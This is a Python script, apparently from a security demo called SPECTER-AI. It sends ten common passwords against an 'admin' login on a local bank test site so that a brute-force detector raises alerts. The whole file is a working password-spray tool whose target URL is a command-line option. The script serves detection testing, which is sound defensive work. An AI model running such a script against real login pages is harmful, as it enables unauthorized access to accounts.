#!/usr/bin/env python3
"""
SPECTER-AI Attacker Simulation — Brute Force
=============================================
Fires 10 failed login attempts against the bank target to trigger SPECTER-AI's
brute-force detector. Five consecutive failures from the same IP within 60s will
generate a BRUTE_FORCE alert and a proactive voice briefing.

Usage:
  python brute_force.py [--target http://localhost:8080]
"""

import argparse
import time

import requests

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    _HAS_RICH = True
except ImportError:
    _HAS_RICH = False

TARGET      = "http://localhost:8080"
USERNAME    = "admin"
DELAY       = 0.2   # seconds between attempts

PASSWORDS = [
    "password123", "qwerty",     "12345678",   "letmein",    "iloveyou",
    "welcome1",    "monkey123",  "dragon99",   "sunshine!",  "trustno1",
]

if _HAS_RICH:
    console = Console()
    def _print(msg, **kw): console.print(msg, **kw)
else:
    def _print(msg, **kw): print(msg)


def _banner(target: str) -> None:
    if _HAS_RICH:
        _print(Panel(
            Text.from_markup(
                "[bold yellow] ████████╗ ██╗  ██╗██████╗ \n"
                " ╚══██╔══╝ ██║  ██║██╔══██╗\n"
                "    ██║    ███████║██████╔╝\n"
                "    ██║    ██╔══██║██╔══██╗\n"
                "    ██║    ██║  ██║██║  ██║[/bold yellow]\n\n"
                "[bold white]SPECTER-AI — BRUTE FORCE SIMULATION[/bold white]\n"
                f"[dim]Target  :[/dim] [cyan]{target}/index.php[/cyan]\n"
                f"[dim]Username:[/dim] [yellow]{USERNAME}[/yellow]\n"
                "[dim]Mode    :[/dim] [yellow]Credential Stuffing / Password Spray[/yellow]\n"
                "[dim]Purpose :[/dim] [dim white]Trigger SPECTER-AI brute-force detection[/dim white]"
            ),
            border_style="bold yellow",
            padding=(0, 4),
        ))
    else:
        print(f"\n[ATTACKER] Brute force initiated against {USERNAME}@{target}\n")


def main() -> None:
    parser = argparse.ArgumentParser(description="SPECTER-AI brute-force simulation")
    parser.add_argument("--target", default=TARGET, help=f"Bank URL (default: {TARGET})")
    args   = parser.parse_args()
    target = args.target.rstrip("/")
    login  = f"{target}/index.php"

    _banner(target)
    _print("")

    if _HAS_RICH:
        _print(
            f"[bold yellow][ BRUTE FORCE ][/bold yellow]"
            f"  Spraying {len(PASSWORDS)} passwords against [cyan]{USERNAME}[/cyan]...\n"
        )

    results = []
    for i, pwd in enumerate(PASSWORDS, 1):
        time.sleep(DELAY)
        try:
            r = requests.post(
                login,
                data={"username": USERNAME, "password": pwd},
                allow_redirects=False,
                timeout=5,
            )
            if r.status_code == 403:
                status_label = "BLOCKED"
                if _HAS_RICH:
                    _print(
                        f"  [dim]Attempt {i:>2}/{len(PASSWORDS)}:[/dim] "
                        f"[yellow]{pwd:<16}[/yellow] [bold red]→ 403 BLOCKED by SPECTER-AI[/bold red]"
                    )
                else:
                    print(f"[ATTACKER] Attempt {i}/{len(PASSWORDS)}: {pwd!r} → BLOCKED (403)")
            elif r.status_code in (301, 302):
                status_label = "BYPASS"
                loc = r.headers.get("Location", "?")
                if _HAS_RICH:
                    _print(
                        f"  [dim]Attempt {i:>2}/{len(PASSWORDS)}:[/dim] "
                        f"[yellow]{pwd:<16}[/yellow] [bold green]→ BYPASS! Redirect → {loc}[/bold green]"
                    )
                else:
                    print(f"[ATTACKER] Attempt {i}/{len(PASSWORDS)}: {pwd!r} → BYPASS")
            else:
                status_label = "login_failed"
                if _HAS_RICH:
                    _print(
                        f"  [dim]Attempt {i:>2}/{len(PASSWORDS)}:[/dim] "
                        f"[yellow]{pwd:<16}[/yellow] [dim]→ {r.status_code} (login_failed)[/dim]"
                    )
                else:
                    print(f"[ATTACKER] Attempt {i}/{len(PASSWORDS)}: {pwd!r} → {r.status_code} (login_failed)")
        except requests.RequestException as exc:
            status_label = "ERROR"
            if _HAS_RICH:
                _print(f"  [dim]Attempt {i:>2}/{len(PASSWORDS)}:[/dim] [red]connection error: {exc}[/red]")
            else:
                print(f"[ATTACKER] Attempt {i}/{len(PASSWORDS)}: ERROR — {exc}")

        results.append((i, pwd, status_label))

        if i == 5:
            if _HAS_RICH:
                _print("\n  [bold yellow]⚡  5 attempts logged — SPECTER-AI should detect now[/bold yellow]\n")
            else:
                print("[ATTACKER] 5 attempts logged — detector threshold reached")

    _print("")
    if _HAS_RICH:
        _print(
            f"  [bold yellow]✓  {len(PASSWORDS)} attempts logged.[/bold yellow] "
            "[dim]Awaiting target lockout via SPECTER-AI voice command 4...[/dim]"
        )
        _print(
            f"\n  [dim]Check alerts: [/dim][cyan]http://localhost:8000/api/alerts[/cyan]\n"
        )
    else:
        print(f"[ATTACKER] {len(PASSWORDS)} attempts logged. Awaiting target lockout.")


if __name__ == "__main__":
    main()
